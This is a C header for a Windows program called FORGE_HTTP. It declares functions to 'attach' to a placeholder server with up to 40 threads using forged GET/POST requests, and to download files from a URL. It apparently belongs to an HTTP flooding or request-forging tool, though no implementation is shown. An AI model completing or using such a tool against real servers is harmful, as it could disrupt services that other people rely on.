#ifndef __FORGE_HTTP_H__
#define __FORGE_HTTP_H__
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <WS2tcpip.h>
#include <winsock2.h>

#include <Windows.h>
#include <WinInet.h>
#include <strsafe.h>

#pragma comment(lib,"WinInet.lib")
#pragma comment(lib,"ws2_32.lib")
#pragma warning(disable:4996)

#define PAGE_SIZE					4096
#define ATTACH_SERVER_URL_ADDRESS	"xxx.xxx.xxx.xxx"
#define ATTACH_SERVER_RES_ADDRESS	""
#define ATTACH_SERVER_PORT			3838
#define ATTACH_SERVER_TYPE_GET		"GET"
#define ATTACH_SERVER_TYPE_POST		"POST"
#define MAXIMUM_ATTACH_THREAD		40

//#define DOWNLOAD

typedef struct _FORGE_HTTP_ATTACH_PARAMTER
{
	CHAR AttachUrlAddrA[MAX_PATH];
	CHAR AttachUriA[MAX_PATH];
	USHORT uAttachPort;
}FORGE_HTTP_ATTACH_PARAMTER,*PFORGE_HTTP_ATTACH_PARAMTER;

extern HANDLE g_hAttachThread[MAXIMUM_ATTACH_THREAD];
extern ULONG g_ulThreadId[MAXIMUM_ATTACH_THREAD];
extern PFORGE_HTTP_ATTACH_PARAMTER g_pForgeHttpParamter;



BOOLEAN ForgeHttpAttach(PCHAR pAttachUrlAddr,USHORT uAttachPort,PCHAR pAttachUri);
BOOLEAN DownloadFileFromUrl(PCHAR pUrl,PCHAR pSaveFileName);
BOOLEAN CheckFileExist(PCHAR lpszPath);

#endif